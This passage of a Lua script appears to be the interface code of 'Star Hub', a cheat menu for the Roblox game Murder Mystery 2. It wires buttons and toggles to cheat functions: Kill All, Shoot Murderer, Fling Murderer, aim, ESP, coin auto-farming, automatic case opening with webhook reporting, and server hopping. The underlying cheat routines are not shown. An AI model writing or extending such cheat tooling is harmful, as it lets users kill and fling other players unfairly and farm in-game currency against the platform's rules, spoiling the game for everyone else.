	textButton.AnchorPoint = Vector2.new(0, 0.5)
	textButton.Position = UDim2.new(0, 584, 0.38, 84)
	_G.__TrackButtonPosition("KillAll", textButton)
	textButton.Active = true
	textButton.AutoLocalize = false
	textButton.Parent = screenGui
	local value240 = _G.__StyleSquareButton(textButton, "__mm2_default_knife", "KILL\nALL", Color3.fromRGB(255, 35, 60))
	_G.KillAllButtonRequested = false

	_G.KillAllButtonSetEnabled = function(flag253)
		_G.KillAllButtonRequested = flag253 and true or false
		screenGui.Enabled = _G.KillAllButtonRequested
	end

	textButton.MouseEnter:Connect(function()
		TweenService:Create(value240, TweenInfo.new(0.13), { Color = Color3.fromRGB(255, 110, 125), Transparency = 0 }):Play()
	end)

	textButton.MouseLeave:Connect(function()
		TweenService:Create(value240, TweenInfo.new(0.13), { Color = Color3.fromRGB(255, 35, 60), Transparency = 0.15 }):Play()
	end)

	local flag254 = false
	local flag255 = false
	local position = nil
	local position2 = nil
	local value241 = nil

	textButton.InputBegan:Connect(function(input)
		if _G.LockButtonsEnabled then
			return
		end

		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			flag254 = true
			flag255 = false
			position = input.Position
			position2 = textButton.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					flag254 = false
				end
			end)
		end
	end)

	textButton.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			value241 = input
		end
	end)

	table.insert(_G.CoinESPConn, UserInputService.InputChanged:Connect(function(input)
		if flag254 and input == value241 then
			local n2 = input.Position - position

			if n2.Magnitude > 6 then
				flag255 = true
			end

			textButton.Position = UDim2.new(position2.X.Scale, position2.X.Offset + n2.X, position2.Y.Scale, position2.Y.Offset + n2.Y)
		end
	end))

	textButton.Activated:Connect(function()
		if flag255 or _G.KillAllBusy then
			return
		end
		local flag256, flag257 = _G.KillAllMurderer()

		if _G.WindNotify then
			_G.WindNotify("Kill All", tostring(flag257 or flag256 and "Started" or "Unavailable"), flag256 and "skull" or "circle-x")
		end
	end)
end

local obj46

obj46 = starUI:CreateWindow({
	Title = "Star Hub",
	Icon = "star",
	Logo = "rbxthumb://type=Asset&id=118194363324034&w=420&h=420",
	Author = "Murder Mystery 2",
	Folder = "MarbegMM2",
	Size = UDim2.fromOffset(740, 520),
	MinSize = Vector2.new(560, 380),
	Resizable = true,
	SideBarWidth = 210,
	HideSearchBar = true,
	ScrollBarEnabled = false,
	User = { Enabled = true, Anonymous = false },
	OpenButton = {
		Title = "Star Hub",
		Icon = "star",
		CornerRadius = UDim.new(1, 0),
		StrokeThickness = 2,
		Enabled = true,
		Draggable = true,
		OnlyMobile = true,
	},
})

_G.WindUIWindow = obj46
_G.ObsidianWindow = nil

pcall(function()
	obj46:Tag({ Title = _G.ScriptVersion })
end)

table.insert(_G.CoinESPConn, UserInputService.InputBegan:Connect(function(input)
	if input.KeyCode == (_G.MenuToggleKey or Enum.KeyCode.RightShift) and not UserInputService:GetFocusedTextBox() then
		pcall(function()
			obj46:Toggle()
		end)
	end
end))

local tbl121
tbl121 = { Home = obj46:Tab({ Title = "Home", Icon = "house" }) }
obj46:Divider()
local obj47 = obj46:Section({ Title = "Settings", Icon = "settings", Opened = false })
tbl121.Buttons = obj47:Tab({ Title = "On-Screen Buttons", Icon = "mouse-pointer-click" })
tbl121.Keybinds = UserInputService.KeyboardEnabled and obj47:Tab({ Title = "Keybinds", Icon = "keyboard" }) or nil
tbl121.General = obj47:Tab({ Title = "General", Icon = "sliders-horizontal" })
local obj48 = obj46:Section({ Title = "Player", Icon = "user", Opened = true })
tbl121.Movement = obj48:Tab({ Title = "Movement", Icon = "footprints" })
tbl121.Emotes = obj48:Tab({ Title = "Emotes", Icon = "smile" })
tbl121.Players = obj48:Tab({ Title = "Players", Icon = "users" })
local obj49 = obj46:Section({ Title = "Combat", Icon = "swords", Opened = true })
tbl121.Aim = obj49:Tab({ Title = "Aim", Icon = "crosshair" })
tbl121.Roles = obj49:Tab({ Title = "Sheriff & Murderer", Icon = "sword" })
tbl121.Fling = obj49:Tab({ Title = "Fling", Icon = "wind" })
local obj50 = obj46:Section({ Title = "Visuals", Icon = "eye", Opened = true })
tbl121.ESP = obj50:Tab({ Title = "ESP", Icon = "scan-eye" })
tbl121.Effects = obj50:Tab({ Title = "Effects", Icon = "sparkles" })
tbl121.World = obj50:Tab({ Title = "World", Icon = "sun" })
tbl121.Crosshair = obj50:Tab({ Title = "Crosshair", Icon = "locate-fixed" })
local obj51 = obj46:Section({ Title = "Skin Changer", Icon = "palette", Opened = true })
tbl121.GunSkins = obj51:Tab({ Title = "Gun", Icon = "crosshair" })
tbl121.KnifeSkins = obj51:Tab({ Title = "Knife", Icon = "sword" })
local obj52 = obj46:Section({ Title = "Farming", Icon = "coins", Opened = true })
tbl121.Farm = obj52:Tab({ Title = "Auto Farm", Icon = "bot" })
tbl121.Cases = obj52:Tab({ Title = "Cases", Icon = "package-open" })
tbl121.Webhook = obj52:Tab({ Title = "Webhook", Icon = "webhook" })
_G.CrosshairTab = tbl121.Crosshair
_G.MM2ScriptConfig = obj46.ConfigManager and obj46.ConfigManager:CreateConfig("mm2_settings")
_G.AutoConfigEnabled = true
_G.ConfigLoading = false
_G.ConfigReady = false
_G.ConfigSaveToken = 0

_G.SaveScriptConfig = function(flag258)
	if not _G.MM2ScriptConfig then
		flag258 = flag258 and _G.WindNotify

		if flag258 then
			_G.WindNotify("Config", "Config is not supported.", "circle-x")
		end

		return false
	end

	local ok = pcall(function()
		_G.MM2ScriptConfig:Save()
	end)

	if flag258 and _G.WindNotify then
		_G.WindNotify("Config", ok and "Settings saved." or "Save failed.", ok and "save" or "circle-x")
	end

	return ok
end

_G.QueueConfigSave = function()
	if not _G.ConfigReady or not _G.AutoConfigEnabled or _G.ConfigLoading then
		return
	end
	local value242 = _G
	value242.ConfigSaveToken = value242.ConfigSaveToken + 1
	local configSaveToken = _G.ConfigSaveToken

	task.delay(0.35, function()
		if configSaveToken == _G.ConfigSaveToken and _G.AutoConfigEnabled and not _G.ConfigLoading then
			_G.SaveScriptConfig(false)
		end
	end)
end

_G.LoadScriptConfig = function(flag259)
	if not _G.MM2ScriptConfig then
		return false
	end
	_G.ConfigLoading = true

	local ok = pcall(function()
		_G.MM2ScriptConfig:Load()
	end)

	_G.ConfigLoading = false

	if flag259 and _G.WindNotify then
		_G.WindNotify("Config", ok and "Settings loaded." or "No saved config found.", ok and "folder-open" or "circle-x")
	end

	return ok
end

queueConfigSave = _G.QueueConfigSave
saveScriptConfig = _G.SaveScriptConfig
loadScriptConfig = _G.LoadScriptConfig
local func243

func243 = function(param246, flag260, flag261)
	pcall(function()
		starUI:Notify({
			Title = param246,
			Content = flag260 and "Enabled" or "Disabled",
			Duration = 2,
			Icon = flag260 and (flag261 or "circle-check") or "circle-off",
		})
	end)
end

local tbl122

local function func244(param247)
	if type(param247) == "string" then
		return _G[param247]
	end
	return param247
end

tbl122 = {
	Box = function(obj53, param248, param249)
		return obj53:Section({ Title = param248, Icon = param249, Opened = true })
	end,
	Switch = function(param250)
		return param250
	end,
	Toggle = function(obj54, param251)
		return tbl122.Switch(obj54:Toggle({
			Title = param251.Title,
			Flag = param251.Flag,
			Value = param251.Value == true,
			Callback = function(value)
				local set = func244(param251.Set)

				if set then
					set(value)
				end

				queueConfigSave()

				if param251.Notify then
					func243(param251.Title, value, param251.Notify)
				end
			end,
		}))
	end,
	Slider = function(obj55, param252)
		return obj55:Slider({
			Title = param252.Title,
			Step = param252.Step or 1,
			Flag = param252.Flag,
			Value = { Min = param252.Min, Max = param252.Max, Default = param252.Default },
			Callback = function(value)
				local set2 = func244(param252.Set)

				if set2 then
					set2(value)
				end

				queueConfigSave()
			end,
		})
	end,
	Color = function(obj56, param253)
		return obj56:Colorpicker({
			Title = param253.Title,
			Flag = param253.Flag,
			Default = param253.Default,
			Callback = function(value)
				local set3 = func244(param253.Set)

				if set3 then
					set3(value)
				end

				queueConfigSave()
			end,
		})
	end,
	Action = function(obj57, param254)
		return obj57:Button({
			Title = param254.Title,
			Icon = param254.Icon,
			Color = param254.Color,
			Callback = function()
				local flag262, flag263 = param254.Run()

				if _G.WindNotify then
					local windNotify = _G.WindNotify
					local title = param254.Title
					local str14 = tostring(flag263 or flag262 and "Done" or "Failed")
					local icon

					if flag262 then
						icon = param254.Icon or "circle-check"
					else
						icon = flag262
					end

					windNotify(title, str14, icon or "circle-x")
				end
			end,
		})
	end,
}

_G.AnonymousMode = false

_G.AnonymousSetEnabled = function(flag264)
	_G.AnonymousMode = flag264 == true

	pcall(function()
		_G.WindUIWindow.User:SetAnonymous(_G.AnonymousMode)
	end)

	if _G.__HomeApplyIdentity then
		pcall(_G.__HomeApplyIdentity)
	end
end

_G.__BuildHome = function()
	local function func245(param255)
		if type(param255) ~= "number" then
			return "-"
		end
		return (tostring(math.floor(param255)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", ""))
	end

	local function func246(param256)
		local n2 = math.max(0, math.floor(param256))
		return string.format("%dh %02dm", n2 // 3600, n2 % 3600 // 60)
	end

	local themeColor = _G.__ThemeColor

	local tbl123 = {
		Murderer = Color3.fromRGB(235, 50, 60),
		Sheriff = Color3.fromRGB(45, 120, 255),
		Hero = Color3.fromRGB(240, 190, 30),
		Innocent = Color3.fromRGB(40, 190, 90),
		Lobby = Color3.fromRGB(110, 112, 128),
		Dead = Color3.fromRGB(80, 80, 90),
	}

	local function func247(param257)
		local windUI = _G.WindUI

		if windUI and windUI.Creator and windUI.Creator.Icon then
			local ok, result = pcall(windUI.Creator.Icon, param257)
			if ok and type(result) == "table" and result[1] then
				return result[1]
			end
		end

		return ""
	end

	local function createUICorner(parent, cornerRadius)
		local uiCorner = Instance.new("UICorner")
		uiCorner.CornerRadius = cornerRadius
		uiCorner.Parent = parent
		return uiCorner
	end

	local function createTextLabel(parent, text, textSize, flag265)
		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.Text = text
		textLabel.TextSize = textSize
		textLabel.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", flag265 or Enum.FontWeight.Medium)
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.AutoLocalize = false
		textLabel.Parent = parent
		return textLabel
	end

	local scrollingFrame = tbl121.Home.ContainerFrame and tbl121.Home.ContainerFrame:FindFirstChild("ScrollingFrame")
	local tbl124 = {}

	if scrollingFrame then
		local frame = Instance.new("Frame")
		frame.Name = "StarHubDashboard"
		frame.LayoutOrder = -100
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(1, 0, 0, 0)
		frame.AutomaticSize = Enum.AutomaticSize.Y
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Padding = UDim.new(0, 10)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = frame
		local palette = _G.StarUI.Palette
		local list41 = {}

		local function func248(layoutOrder, param258)
			local frame2 = Instance.new("Frame")
			frame2.LayoutOrder = layoutOrder
			frame2.Size = UDim2.new(1, 0, 0, param258)
			frame2.BorderSizePixel = 0
			frame2.Parent = frame
			createUICorner(frame2, UDim.new(0, 12))
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Rotation = 90
			local color = Color3.fromRGB
			uiGradient.Color = ColorSequence.new(Color3.fromRGB(20, 20, 24), color(15, 15, 18))
			uiGradient.Parent = frame2
			local uiStroke = Instance.new("UIStroke")
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
			uiStroke.Color = Color3.new(1, 1, 1)
			uiStroke.Parent = frame2
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Parent = uiStroke
			list41[#list41 + 1] = { frame = frame2, edge = uiGradient2 }
			return frame2, uiGradient2
		end

		local value243, value244 = func248(1, 120)
		local frame2 = Instance.new("Frame")
		frame2.BorderSizePixel = 0
		frame2.Size = UDim2.fromScale(1, 1)
		frame2.BackgroundTransparency = 0.82
		frame2.Parent = value243
		createUICorner(frame2, UDim.new(0, 12))
		local uiGradient = Instance.new("UIGradient")
		local numberSequence = NumberSequence.new
		local value245 = NumberSequenceKeypoint.new(0, 0)
		local value246 = NumberSequenceKeypoint.new(0.55, 0.75)
		local tbl125 = { value245, value246 }

		do
			local values = table.pack(NumberSequenceKeypoint.new(1, 1))
			table.move(values, 1, values.n, 3, tbl125)
		end

		uiGradient.Transparency = numberSequence(tbl125)
		uiGradient.Parent = frame2
		local imageLabel = Instance.new("ImageLabel")
		imageLabel.Size = UDim2.fromOffset(56, 56)
		imageLabel.Position = UDim2.fromOffset(16, 16)
		imageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
		imageLabel.BackgroundTransparency = 0.6
		imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. localPlayer.UserId .. "&w=150&h=150"
		imageLabel.Parent = value243
		createUICorner(imageLabel, UDim.new(1, 0))
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Thickness = 2
		uiStroke.Parent = imageLabel
		local textLabel4 = createTextLabel(value243, localPlayer.DisplayName, 17, Enum.FontWeight.Bold)
		textLabel4.Position = UDim2.fromOffset(86, 21)
		textLabel4.Size = UDim2.new(1, -196, 0, 20)
		textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
		local textLabel5 = createTextLabel(value243, "@" .. localPlayer.Name, 12)
		textLabel5.Position = UDim2.fromOffset(86, 44)
		textLabel5.Size = UDim2.new(1, -196, 0, 14)
		textLabel5.TextTruncate = Enum.TextTruncate.AtEnd

		_G.__HomeApplyIdentity = function()
			local anonymousMode = _G.AnonymousMode == true
			imageLabel.Image = "rbxthumb://type=AvatarHeadShot&id=" .. (anonymousMode and 1 or localPlayer.UserId) .. "&w=150&h=150"
			textLabel4.Text = anonymousMode and "Anonymous" or localPlayer.DisplayName
			textLabel5.Text = anonymousMode and "@anonymous" or "@" .. localPlayer.Name
		end

		_G.__HomeApplyIdentity()
		local frame3 = Instance.new("Frame")
		frame3.AnchorPoint = Vector2.new(1, 0.5)
		frame3.Position = UDim2.new(1, -16, 0, 44)
		frame3.Size = UDim2.fromOffset(0, 24)
		frame3.AutomaticSize = Enum.AutomaticSize.X
		frame3.BorderSizePixel = 0
		frame3.Parent = value243
		createUICorner(frame3, UDim.new(1, 0))
		local uiStroke2 = Instance.new("UIStroke")
		uiStroke2.Color = Color3.fromRGB(10, 10, 16)
		uiStroke2.Transparency = 0.3
		uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		uiStroke2.Parent = frame3
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Rotation = 90
		uiGradient2.Color = ColorSequence.new(Color3.new(1, 1, 1), Color3.fromRGB(190, 190, 190))
		uiGradient2.Parent = frame3
		local lobby = createTextLabel(frame3, "LOBBY", 11, Enum.FontWeight.Heavy)
		lobby.AutomaticSize = Enum.AutomaticSize.X
		lobby.Size = UDim2.fromOffset(0, 24)
		lobby.TextColor3 = Color3.new(1, 1, 1)
		lobby.TextStrokeTransparency = 0.5
		lobby.TextXAlignment = Enum.TextXAlignment.Center
		local uiPadding = Instance.new("UIPadding")
		uiPadding.PaddingLeft = UDim.new(0, 12)
		uiPadding.PaddingRight = UDim.new(0, 12)
		uiPadding.Parent = lobby
		local frame4 = Instance.new("Frame")
		frame4.BackgroundTransparency = 1
		frame4.Position = UDim2.fromOffset(16, 84)
		frame4.Size = UDim2.new(1, -32, 0, 22)
		frame4.Parent = value243
		local uiListLayout2 = Instance.new("UIListLayout")
		uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout2.Padding = UDim.new(0, 6)
		uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout2.Parent = frame4
		local list42 = {}

		local function func249(layoutOrder, param259, imageColor3)
			local frame5 = Instance.new("Frame")
			frame5.LayoutOrder = layoutOrder
			frame5.Size = UDim2.fromOffset(0, 22)
			frame5.AutomaticSize = Enum.AutomaticSize.X
			frame5.BorderSizePixel = 0
			frame5.Parent = frame4
			createUICorner(frame5, UDim.new(1, 0))
			local uiPadding2 = Instance.new("UIPadding")
			uiPadding2.PaddingLeft = UDim.new(0, 8)
			uiPadding2.PaddingRight = UDim.new(0, 10)
			uiPadding2.Parent = frame5
			local uiListLayout3 = Instance.new("UIListLayout")
			uiListLayout3.FillDirection = Enum.FillDirection.Horizontal
			uiListLayout3.VerticalAlignment = Enum.VerticalAlignment.Center
			uiListLayout3.Padding = UDim.new(0, 5)
			uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout3.Parent = frame5
			local imageLabel2 = Instance.new("ImageLabel")
			imageLabel2.Size = UDim2.fromOffset(12, 12)
			imageLabel2.BackgroundTransparency = 1
			imageLabel2.Image = func247(param259)
			imageLabel2.ImageColor3 = imageColor3
			imageLabel2.Parent = frame5
			local textLabel6 = createTextLabel(frame5, "", 11, Enum.FontWeight.SemiBold)
			textLabel6.LayoutOrder = 1
			textLabel6.AutomaticSize = Enum.AutomaticSize.X
			textLabel6.Size = UDim2.fromOffset(0, 22)
			list42[#list42 + 1] = { frame = frame5, text = textLabel6 }
			return frame5, textLabel6
		end

		local value247, value248 = func249(1, "sword", Color3.fromRGB(255, 80, 90))
		tbl124.murdererChip = value247
		tbl124.murdererText = value248
		tbl124.murdererIcon = tbl124.murdererChip:FindFirstChildWhichIsA("ImageLabel")
		local sword = func247("sword")
		local hourglass = func247("hourglass")
		tbl124.swordImage = sword
		tbl124.waitImage = hourglass
		local value249, value250 = func249(2, "shield", Color3.fromRGB(80, 150, 255))
		tbl124.sheriffChip = value249
		tbl124.sheriffText = value250
		local value251, value252 = func249(3, "shopping-bag", Color3.fromRGB(255, 196, 60))
		tbl124.bagChip = value251
		tbl124.bagText = value252
		local list43 = {}

		local function func250(param260, list44)
			local value253 = func248(param260, 68)
			local tbl126 = {}

			for i, item71 in ipairs(list44) do
				local frame5 = Instance.new("Frame")
				frame5.BackgroundTransparency = 1
				frame5.Position = UDim2.fromScale((i - 1) / #list44, 0)
				frame5.Size = UDim2.fromScale(1 / #list44, 1)
				frame5.Parent = value253
				local textLabel7 = createTextLabel(frame5, "-", 20, Enum.FontWeight.Heavy)
				textLabel7.TextXAlignment = Enum.TextXAlignment.Center
				textLabel7.Position = UDim2.fromOffset(6, 13)
				textLabel7.Size = UDim2.new(1, -12, 0, 22)
				textLabel7.TextTruncate = Enum.TextTruncate.AtEnd
				local uiGradient3 = Instance.new("UIGradient")
				uiGradient3.Rotation = 90
				local color = Color3.fromRGB
				uiGradient3.Color = ColorSequence.new(Color3.new(1, 1, 1), color(182, 182, 192))
				uiGradient3.Parent = textLabel7
				local textLabel8 = createTextLabel(frame5, item71[1], 11, Enum.FontWeight.Heavy)
				textLabel8.TextXAlignment = Enum.TextXAlignment.Center
				textLabel8.Position = UDim2.fromOffset(6, 40)
				textLabel8.Size = UDim2.new(1, -12, 0, 13)
				textLabel8.TextColor3 = Color3.new(1, 1, 1)
				textLabel8.TextTruncate = Enum.TextTruncate.AtEnd
				local second1 = item71[2]
				local uiGradient4 = Instance.new("UIGradient")
				local colorSequence = ColorSequence.new
				local value254 = ColorSequenceKeypoint.new(0, second1)
				local value255 = ColorSequenceKeypoint.new(0.42, second1)
				local value256 = ColorSequenceKeypoint.new(0.5, second1:Lerp(Color3.new(1, 1, 1), 0.85))
				local value257 = ColorSequenceKeypoint.new(0.58, second1)
				local new = ColorSequenceKeypoint.new
				local tbl127 = { value254, value255, value256, value257 }

				do
					local values = table.pack(new(1, second1))
					table.move(values, 1, values.n, 5, tbl127)
				end

				uiGradient4.Color = colorSequence(tbl127)
				uiGradient4.Offset = Vector2.new(-1, 0)
				uiGradient4.Parent = textLabel8
				TweenService:Create(uiGradient4, TweenInfo.new(1.4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, false, 2.6 + i * 0.15), { Offset = Vector2.new(1, 0) }):Play()

				if i > 1 then
					local frame6 = Instance.new("Frame")
					frame6.BorderSizePixel = 0
					frame6.Position = UDim2.new(0, 0, 0, 16)
					frame6.Size = UDim2.new(0, 1, 1, -32)
					frame6.Parent = frame5
					list43[#list43 + 1] = frame6
				end

				tbl126[i] = textLabel7
				list43[#list43 + 1] = textLabel7
			end

			return tbl126
		end

		local tbl128 = { "COINS", Color3.fromRGB(255, 196, 60) }
		local tbl129 = { "GEMS", Color3.fromRGB(120, 200, 255) }
		local tbl130 = { "LEVEL", Color3.fromRGB(190, 140, 255) }
		local tbl131 = { tbl128, tbl129, tbl130 }
		local tbl132 = func250(2, tbl131)
		local first3 = tbl132[1]
		local second2 = tbl132[2]
		local third1 = tbl132[3]
		tbl124.coins = first3
		tbl124.gems = second2
		tbl124.level = third1
		local tbl133 = { "AUTO FARM", Color3.fromRGB(142, 142, 151) }
		local tbl134 = { "PER HOUR", Color3.fromRGB(80, 220, 140) }
		local tbl135 = { "COLLECTED", Color3.fromRGB(255, 140, 90) }
		local tbl136 = { "UPTIME", Color3.fromRGB(243, 243, 245) }
		local tbl137 = { tbl133, tbl134, tbl135, tbl136 }
		local tbl138 = func250(3, tbl137)
		local second3 = tbl138[2]
		local third2 = tbl138[3]
		local entry21 = tbl138[4]
		tbl124.farm = tbl138[1]
		tbl124.rate = second3
		tbl124.collected = third2
		tbl124.uptime = entry21
		tbl124.pill = frame3
		tbl124.pillText = lobby
		tbl124.ring = uiStroke
		tbl124.glow = frame2
		tbl124.cardEdge = value244

		_G.__OnTheme(function()
			local Text = themeColor("Text", Color3.new(1, 1, 1))
			local Placeholder = themeColor("Placeholder", Color3.fromRGB(150, 150, 160))

			for i, item72 in ipairs(list41) do
				item72.frame.BackgroundColor3 = Color3.new(1, 1, 1)

				if i > 1 then
					item72.edge.Color = ColorSequence.new(palette.cardLine)
				end
			end

			for _, item73 in ipairs(list43) do
				if item73:IsA("TextLabel") then
					item73.TextColor3 = Color3.new(1, 1, 1)
				else
					item73.BackgroundColor3 = Text
					item73.BackgroundTransparency = 0.9
				end
			end

			for _, item74 in ipairs(list42) do
				item74.frame.BackgroundColor3 = Text
				item74.frame.BackgroundTransparency = 0.93
				item74.text.TextColor3 = Text
			end

			textLabel4.TextColor3 = Text
			textLabel5.TextColor3 = Placeholder
		end)

		frame.Parent = scrollingFrame
	end

	local value258 = tbl122.Box(tbl121.Home, "Quick Actions", "zap")

	tbl122.Action(value258, {
		Title = "Shoot Murderer",
		Icon = "crosshair",
		Run = function()
			local shootMurdererStatus = _G.ShootMurdererStatus
			return _G.ShootMurderer(), shootMurdererStatus
		end,
	})

	tbl122.Action(value258, {
		Title = "Fling Murderer",
		Icon = "skull",
		Run = function()
			return _G.RoleFlingTarget({ "Murderer" })
		end,
	})

	tbl122.Action(value258, {
		Title = "Kill All",
		Icon = "sword",
		Run = function()
			return _G.KillAllMurderer()
		end,
	})

	tbl122.Action(value258, {
		Title = "Hop Server",
		Icon = "shuffle",
		Run = function()
			return _G.HopServer()
		end,
	})

	local now = os.clock()

	local function func251()
		local playerData = CurrentRoundClient.PlayerData
		local flag266 = playerData and playerData[localPlayer.Name]
		if not _G.__RealInRound or not flag266 or not flag266.Role or flag266.Role == "Lobby" then
			return "Lobby"
		end
		local str15 = "-"
		local str16 = "-"

		for k, value259 in pairs(playerData) do
			if type(value259) == "table" and not value259.Dead then
				if value259.Role == "Murderer" then
					str15 = k
				elseif value259.Role == "Sheriff" or value259.Role == "Hero" then
					str16 = k
				end
			end
		end

		local role = flag266.Role

		if role == "Innocent" and _G.__IsHeroNow and _G.__IsHeroNow(localPlayer) then
			role = "Hero"
		end

		return flag266.Dead and "Dead" or role, str15, str16
	end

	local function func252(list45)
		if _G.AnonymousMode and list45 == localPlayer.Name then
			return "You"
		end
		return #list45 > 13 and list45:sub(1, 12) .. "…" or list45
	end

	local homeLoopId = {}
	_G.__HomeLoopId = homeLoopId

	task.spawn(function()
		while _G.__HomeLoopId == homeLoopId do
			if tbl124.pill then
				pcall(function()
					local flag267, value260, value261 = func251()
					local lobby = tbl123[flag267] or tbl123.Lobby
					tbl124.pill.BackgroundColor3 = lobby
					tbl124.ring.Color = lobby
					tbl124.glow.BackgroundColor3 = lobby
					tbl124.cardEdge.Color = ColorSequence.new(lobby, _G.StarUI.Palette.cardLine)
					tbl124.pillText.Text = string.upper(flag267)
					local visible = flag267 ~= "Lobby"
					tbl124.murdererText.Text = visible and func252(value260) or "Waiting for a round"
					tbl124.murdererIcon.Image = visible and tbl124.swordImage or tbl124.waitImage
					tbl124.murdererIcon.ImageColor3 = visible and Color3.fromRGB(255, 80, 90) or Color3.fromRGB(150, 150, 160)
					tbl124.sheriffChip.Visible = visible
					tbl124.sheriffText.Text = visible and func252(value261) or ""
					tbl124.bagChip.Visible = visible
					tbl124.bagText.Text = _G.BagFull and "Bag full" or "Bag filling"
				end)

				pcall(function()
					local value262, value263, flag268 = _G.__FarmAccountStats()
					tbl124.coins.Text = func245(value262)
					tbl124.gems.Text = func245(value263)
					tbl124.level.Text = tostring(flag268 or "-")
				end)

				pcall(function()
					local ok, result, result2, result3 = pcall(_G.FarmGetRates)
					tbl124.rate.Text = (result3 or 0) >= 2 and func245(result2) or "-"
					tbl124.collected.Text = func245(_G.FarmCoinsCollected or 0)
					tbl124.farm.Text = _G.AutoFarmEnabled and "ON" or "OFF"
					tbl124.uptime.Text = func246(os.clock() - now)
					tbl124.farm.TextColor3 = _G.AutoFarmEnabled and Color3.fromRGB(120, 235, 165) or themeColor("Placeholder", Color3.fromRGB(150, 150, 160))
				end)
			end

			task.wait(1)
		end
	end)
end

_G.__BuildHome()

do
	local value264 = tbl122.Box(tbl121.Farm, "Coin Farm", "coins")

	local obj58 = tbl122.Toggle(value264, {
		Title = "Auto Farm Coins",
		Flag = "AutoFarmCoins",
		Set = "AutoFarmSetEnabled",
		Notify = "bot",
	})

	_G.__SetReflectToggleOff(function()
		pcall(function()
			obj58:Set(false)
		end)
	end)

	tbl122.Toggle(value264, {
		Title = "Farm Underground",
		Flag = "CollectCoinsUnderground",
		Value = true,
		Set = "CollectCoinsUndergroundSetEnabled",
		Notify = "move-down",
	})

	tbl122.Slider(value264, {
		Title = "Farm Speed",
		Flag = "FarmSpeed",
		Min = 15,
		Max = 25,
		Default = 25,
		Set = "AutoFarmSetSpeed",
	})
end

local value265 = tbl122.Box(tbl121.Farm, "When The Bag Is Full", "backpack")

tbl122.Toggle(value265, {
	Title = "Fling Murderer",
	Flag = "FlingMurdererAfterBagFull",
	Set = "FlingMurdererAfterBagFullSetEnabled",
	Notify = "skull",
})

tbl122.Toggle(value265, {
	Title = "Shoot Murderer",
	Flag = "ShootMurdererAfterBagFull",
	Set = "ShootMurdererAfterBagFullSetEnabled",
	Notify = "crosshair",
})

tbl122.Toggle(value265, {
	Title = "Kill All",
	Flag = "KillAllAfterBagFull",
	Set = "KillAllAfterBagFullSetEnabled",
	Notify = "swords",
})

tbl122.Toggle(value265, {
	Title = "Reset Character",
	Flag = "ResetAfterBagFull",
	Set = "ResetCharacterSetEnabled",
	Notify = "rotate-ccw",
})

do
	local obj59 = tbl122.Box(tbl121.Farm, "Stats", "chart-line")
	local obj60 = obj59:Paragraph({ Title = "Coin Rate", Desc = "Waiting for the first coins..." })

	obj59:Button({
		Title = "Reset Stats",
		Icon = "rotate-ccw",
		Callback = function()
			_G.FarmResetRates()

			pcall(function()
				obj60:SetDesc("Waiting for the first coins...")
			end)
		end,
	})

	local farmStatsLoopId = {}
	_G.__FarmStatsLoopId = farmStatsLoopId

	task.spawn(function()
		while _G.__FarmStatsLoopId == farmStatsLoopId do
			task.wait(1)
			local ok, result, result2, result3 = pcall(_G.FarmGetRates)

			if ok then
				local str17

				if (result3 or 0) < 2 then
					str17 = string.format("Collected: %d\nNeed a few more coins to measure the rate.", _G.FarmCoinsCollected or 0)
				else
					str17 = string.format([[Collected: %d
Per minute: %.1f
Per hour: %.0f
From the last %d pickups]], _G.FarmCoinsCollected or 0, result, result2, result3)
				end

				pcall(function()
					obj60:SetDesc(str17)
				end)
			end
		end
	end)
end

tbl122.Toggle(tbl122.Box(tbl121.Farm, "Daily Quest", "clipboard-check"), {
	Title = "Daily Quest Checker",
	Flag = "DailyQuestChecker",
	Set = "DailyQuestCheckerSetEnabled",
	Notify = "clipboard-check",
})

local obj61 = tbl122.Box(tbl121.Cases, "Auto Open", "package-open")

tbl122.Toggle(obj61, {
	Title = "Auto Open Cases",
	Flag = "AutoCase",
	Set = "AutoCaseSetEnabled",
	Notify = "package-open",
})

obj61:Dropdown({
	Title = "Case",
	Values = _G.AutoCaseBoxList or { "MysteryBox1", "MysteryBox2", "KnifeBox3", "KnifeBox4", "GunBox3" },
	Flag = "AutoCaseBox",
	Value = "MysteryBox1",
	AllowNone = false,
	Callback = function(value)
		_G.AutoCaseSetBox(value)
		queueConfigSave()
	end,
})

tbl122.Slider(obj61, {
	Title = "Keep Coin Reserve",
	Flag = "AutoCaseReserve",
	Min = 0,
	Max = 100000,
	Default = 0,
	Step = 500,
	Set = "AutoCaseSetReserve",
})

tbl122.Toggle(obj61, {
	Title = "Only While Farming",
	Flag = "AutoCaseOnlyFarming",
	Value = true,
	Set = "AutoCaseSetOnlyWhileFarming",
})

tbl122.Toggle(obj61, {
	Title = "Report To Webhook",
	Flag = "AutoCaseWebhook",
	Value = true,
	Set = "AutoCaseSetWebhookReport",
})

do
	local obj62 = tbl122.Box(tbl121.Cases, "Status", "gift")
	local obj63 = obj62:Paragraph({ Title = "Idle", Desc = "Opened this session: 0" })

	obj62:Button({
		Title = "Open One Now",
		Icon = "gift",
		Callback = function()
			local flag269 = _G.AutoCaseOpenOnce()

